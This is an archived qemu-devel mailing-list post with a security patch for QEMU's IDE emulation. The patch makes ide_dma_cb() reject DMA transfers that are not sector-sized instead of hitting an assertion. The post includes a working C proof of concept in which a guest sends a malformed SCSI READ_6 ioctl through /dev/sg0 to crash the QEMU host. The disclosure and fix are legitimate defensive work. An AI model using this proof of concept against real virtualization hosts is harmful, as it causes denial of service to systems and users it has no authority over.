<!-- MHonArc v2.6.19+ -->
<!--X-Subject: [PATCH v2 1/1] ide: check DMA transfer size in ide_dma_cb() to prevent qemu DoS from quests -->
<!--X-From-R13: Oyrknaqre Bbcbi &#60;nyrk.cbcbiNyvahk.pbz> -->
<!--X-Date: Thu, 14 Nov 2019 12:27:59 &#45;0500 -->
<!--X-Message-Id: 20191114172531.10644&#45;1&#45;alex.popov@linux.com -->
<!--X-Content-Type: text/plain -->
<!--X-Head-End-->
<!doctype html public "-//W3C//DTD HTML//EN">
<html>
<head>
<title>[PATCH v2 1/1] ide: check DMA transfer size in ide_dma_cb() to prevent q</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
</head>
<body>
<center>
<table border=0 cellspacing=2 cellpadding=0 bgcolor="#000000">
<tr><td><table border=0 bgcolor="#FFFFCC">
<tr><td><big><b>qemu-devel</b></big></td></tr></table></tr></table>
<div class="nowrap">
<small>[<a href="../"
>Top</a>][<a href="/archive/html">All Lists</a>]</small>
</div>
<form method="get" action="/archive/cgi-bin/namazu.cgi">
<input type="text" name="query" size="30">
<input type="submit" name="submit" value="Search">
<input type="hidden" name="idxname" value="qemu-devel">
<a href="/archive/cgi-bin/namazu.cgi?idxname=qemu-devel">Advanced</a>
</form>

</center>
<!--X-Body-Begin-->
<!--X-User-Header-->
<!--X-User-Header-End-->
<!--X-TopPNI-->
<hr>
[<a href="msg02164.html">Date Prev</a>][<a href="msg02166.html">Date Next</a>][<a href="msg02159.html">Thread Prev</a>][<a href="msg02263.html">Thread Next</a>][<a
href="index.html#02165">Date Index</a>][<a
href="threads.html#02165">Thread Index</a>]

<!--X-TopPNI-End-->
<!--X-MsgBody-->
<!--X-Subject-Header-Begin-->
<h2>[PATCH v2 1/1] ide: check DMA transfer size in ide_dma_cb() to prevent q</h2>
<hr>
<table border=0>
<tbody>
<tr>
<td align="right" valign="top">
<b>From</b>: </td>
<td align="left">
Alexander Popov</td>
</tr>
<!--X-Subject-Header-End-->
<!--X-Head-of-Message-->

<tr>
<td align="right" valign="top">
<b>Subject</b>: </td>
<td align="left">
[PATCH v2 1/1] ide: check DMA transfer size in ide_dma_cb() to prevent qemu DoS from quests</td>
</tr>

<tr>
<td align="right" valign="top">
<b>Date</b>: </td>
<td align="left">
Thu, 14 Nov 2019 20:25:31 +0300</td>
</tr>

</tbody>
</table>
<!--X-Head-of-Message-End-->
<!--X-Head-Body-Sep-Begin-->
<hr>
<!--X-Head-Body-Sep-End-->
<!--X-Body-of-Message-->
<pre>The commit a718978ed58a from July 2015 introduced the assertion which
implies that the size of successful DMA transfers handled in ide_dma_cb()
should be multiple of 512 (the size of a sector). But guest systems can
initiate DMA transfers that don't fit this requirement.

PoC for Linux that uses SCSI_IOCTL_SEND_COMMAND to perform such an ATA
command and crash qemu:

#include &lt;stdio.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;stdint.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;scsi/scsi.h&gt;
#include &lt;scsi/scsi_ioctl.h&gt;

#define CMD_SIZE 2048

struct scsi_ioctl_cmd_6 {
        unsigned int inlen;
        unsigned int outlen;
        unsigned char cmd[6];
        unsigned char data[];
};

int main(void)
{
        intptr_t fd = 0;
        struct scsi_ioctl_cmd_6 *cmd = NULL;

        cmd = malloc(CMD_SIZE);
        if (!cmd) {
                perror(&quot;[-] malloc&quot;);
                return 1;
        }

        memset(cmd, 0, CMD_SIZE);
        cmd-&gt;inlen = 1337;
        cmd-&gt;cmd[0] = READ_6;

        fd = open(&quot;/dev/sg0&quot;, O_RDONLY);
        if (fd == -1) {
                perror(&quot;[-] opening sg&quot;);
                return 1;
        }

        printf(&quot;[+] sg0 is opened\n&quot;);

        printf(&quot;[.] qemu should break here:\n&quot;);
        fflush(stdout);
        ioctl(fd, SCSI_IOCTL_SEND_COMMAND, cmd);
        printf(&quot;[-] qemu didn't break\n&quot;);

        free(cmd);

        return 1;
}

For fixing that let's check the number of bytes prepared for the transfer
by the prepare_buf() handler. If it is not a multiple of 512 then end
the DMA transfer with an error.

That also fixes the I/O stall in guests after a DMA transfer request
for less than the size of a sector.

Signed-off-by: Alexander Popov &lt;address@hidden&gt;
---
 hw/ide/core.c | 11 +++++------
 1 file changed, 5 insertions(+), 6 deletions(-)

diff --git a/hw/ide/core.c b/hw/ide/core.c
index 754ff4dc34..85aac614f0 100644
--- a/hw/ide/core.c
+++ b/hw/ide/core.c
@@ -849,6 +849,7 @@ static void ide_dma_cb(void *opaque, int ret)
     int64_t sector_num;
     uint64_t offset;
     bool stay_active = false;
+    int32_t prepared = 0;
 
     if (ret == -EINVAL) {
         ide_dma_error(s);
@@ -892,12 +893,10 @@ static void ide_dma_cb(void *opaque, int ret)
     n = s-&gt;nsector;
     s-&gt;io_buffer_index = 0;
     s-&gt;io_buffer_size = n * 512;
-    if (s-&gt;bus-&gt;dma-&gt;ops-&gt;prepare_buf(s-&gt;bus-&gt;dma, s-&gt;io_buffer_size) &lt; 512) {
-        /* The PRDs were too short. Reset the Active bit, but don't raise an
-         * interrupt. */
-        s-&gt;status = READY_STAT | SEEK_STAT;
-        dma_buf_commit(s, 0);
-        goto eot;
+    prepared = s-&gt;bus-&gt;dma-&gt;ops-&gt;prepare_buf(s-&gt;bus-&gt;dma, s-&gt;io_buffer_size);
+    if (prepared % 512) {
+        ide_dma_error(s);
+        return;
     }
 
     trace_ide_dma_cb(s, sector_num, n, IDE_DMA_CMD_str(s-&gt;dma_cmd));
-- 
2.21.0



</pre>
<!--X-Body-of-Message-End-->
<!--X-MsgBody-End-->
<!--X-Follow-Ups-->
<hr>
<form method="post" action="/mp/yyz.py" enctype="multipart/form-data">
<input type="hidden" name="a" value="alex.popov">
<input type="hidden" name="b" value="[PATCH v2 1/1] ide: check DMA transfer size in ide_dma_cb() to prevent qemu DoS from quests">
<input type="hidden" name="d" value="20191114172531.10644-1-alex.popov@linux.com">
<input type="hidden" name="c" value="linux.com">
<center>reply via email to<br><input type="submit" value=" Alexander Popov "></center>
</form>
<hr>
<table width="100%">
<tr><td align="left">[Prev in Thread]</td>
<td align="center"><b>Current Thread</b></td>
<td align="right">[<a href="msg02263.html">Next in Thread</a>]</td></tr></table>
<ul>
<li><font color="#666666"><strong>[PATCH v2 1/1] ide: check DMA transfer size in ide_dma_cb() to prevent qemu DoS from quests</strong>,
<em>Alexander Popov</em></font>&nbsp;<b>&lt;=</b>
<ul>
<li><b><a name="02263" href="msg02263.html">Re: [PATCH v2 1/1] ide: check DMA transfer size in ide_dma_cb() to prevent qemu DoS from quests</a></b>, <i>Darren Kenny</i>, <tt>2019/11/15</tt>
</li>
<li><b><a name="03582" href="msg03582.html">Re: [PATCH v2 1/1] ide: check DMA transfer size in ide_dma_cb() to prevent qemu DoS from quests</a></b>, <i>Kevin Wolf</i>, <tt>2019/11/21</tt>
<ul>
<li><b><a name="04403" href="msg04403.html">Re: [PATCH v2 1/1] ide: check DMA transfer size in ide_dma_cb() to prevent qemu DoS from quests</a></b>, <i>Alexander Popov</i>, <tt>2019/11/26</tt>
<ul>
<li><b><a name="04407" href="msg04407.html">Re: [PATCH v2 1/1] ide: check DMA transfer size in ide_dma_cb() to prevent qemu DoS from quests</a></b>, <i>Kevin Wolf</i>, <tt>2019/11/26</tt>
<li><b><a name="05283" href="msg05283.html">Re: [PATCH v2 1/1] ide: check DMA transfer size in ide_dma_cb() to prevent qemu DoS from quests</a></b>, <i>Alexander Popov</i>, <tt>2019/11/30</tt>
</li>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>

<hr>
<!--X-Follow-Ups-End-->
<!--X-References-->
<!--X-References-End-->
<!--X-BotPNI-->
<ul>
<li>Prev by Date:
<strong><a href="msg02164.html">Re: Convert VMDK to RAW</a></strong>
</li>
<li>Next by Date:
<strong><a href="msg02166.html">Re: [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to prevent qemu DoS from quest</a></strong>
</li>
<li>Previous by thread:
<strong><a href="msg02159.html">Convert VMDK to RAW</a></strong>
</li>
<li>Next by thread:
<strong><a href="msg02263.html">Re: [PATCH v2 1/1] ide: check DMA transfer size in ide_dma_cb() to prevent qemu DoS from quests</a></strong>
</li>
<li>Index(es):
<ul>
<li><a href="index.html#02165"><strong>Date</strong></a></li>
<li><a href="threads.html#02165"><strong>Thread</strong></a></li>
</ul>
</li>
</ul>

<!--X-BotPNI-End-->
<!--X-User-Footer-->
<!--X-User-Footer-End-->
</body>
</html>
